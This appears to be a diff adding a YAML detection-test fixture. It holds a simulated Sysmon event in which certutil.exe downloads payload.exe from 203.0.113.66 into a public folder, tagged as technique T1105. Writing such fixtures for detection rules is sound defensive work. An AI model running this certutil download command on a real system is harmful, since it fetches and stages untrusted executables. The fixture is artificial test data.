@@ -1,0 +1,4 @@
+title: certutil used to download a payload
+techniques: [T1105]
+events:
+  - {service: sysmon, event_id: 1, hostname: WS-051, user: dave, process_name: 'C:\Windows\System32\certutil.exe', command_line: 'certutil.exe -urlcache -split -f http://203.0.113.66/payload.exe C:\Users\Public\p.exe', message: Process created}
